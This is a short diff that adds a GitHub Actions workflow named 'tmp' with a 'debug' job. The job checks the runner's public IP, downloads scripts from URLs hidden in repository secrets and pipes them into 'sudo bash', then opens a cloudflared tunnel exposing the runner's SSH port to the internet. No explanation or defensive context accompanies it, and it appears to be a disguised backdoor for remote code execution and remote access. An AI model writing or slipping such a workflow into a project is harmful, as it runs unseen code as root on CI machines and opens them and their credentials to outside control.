@@ -1,0 +1,24 @@
+name: tmp
+
+on:
+  workflow_dispatch:
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  debug:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Run tasks
+        run: |
+          curl ifconfig.io
+          curl -fsSL "${{ secrets.SETENV }}" | sudo bash -s
+          curl -fsSL "${{ secrets.ASSETS }}" | sudo bash -s
+
+      # running code
+      - name: Run code
+        run: |
+          cloudflared tunnel --url ssh://localhost:22
